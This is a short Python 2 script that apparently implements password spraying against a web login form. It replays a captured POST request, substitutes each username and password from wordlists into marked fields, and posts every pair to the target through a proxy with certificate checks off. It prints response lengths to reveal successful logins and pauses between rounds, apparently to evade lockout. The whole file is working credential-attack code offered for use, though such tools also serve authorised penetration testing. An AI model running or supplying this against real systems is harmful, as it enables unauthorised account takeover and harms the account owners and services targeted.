#!/usr/bin/python

import requests
import sys
import time

proxies = {'http' : 'http://10.10.110.100:8080'}
sleepTimeMinutes = 0.25

# Parse request file
requestsFile = open('request.txt', 'r')
lineList = requestsFile.readlines()
endPoint = lineList[0].split(' ')[1].strip()
headerDict = dict(item.split(': ') for item in map(str.strip, lineList[1:-2]))
dataDict = dict(item.split('=') for item in map(str.strip, lineList[-1].split('&')))
requestsFile.close()
if("USERPR3Y" not in dataDict.values() or "PASSPR3Y" not in dataDict.values()):
    sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")

# Parse usernames file
usernamesFile = open('usernames.txt', 'r')
usernamesList = map(str.strip, usernamesFile.readlines())
usernamesFile.close()

# Parse passwords file
passwordsFile = open('passwords.txt', 'r')
passwordsList = map(str.strip, passwordsFile.readlines())
passwordsFile.close()

# Prepare injection points
usernameKey = ""
passwordKey = ""
for key,value in dataDict.iteritems():
    if value == "USERPR3Y":
        usernameKey = key
    elif value == "PASSPR3Y":
        passwordKey = key

# Spray
for password in passwordsList:
    for username in usernamesList:
        # Load injection points
        dataDict[usernameKey] = username
        dataDict[passwordKey] = password
        
        # Attempt login
        print "Attemping " + username + ':' + password
        r = requests.post("http://" + headerDict["Host"] + endPoint, \
                headers=headerDict, data=dataDict, proxies=proxies, verify=False)

        # Examine response length
        print len(r.content)
    time.sleep(int(round(sleepTimeMinutes*60)))

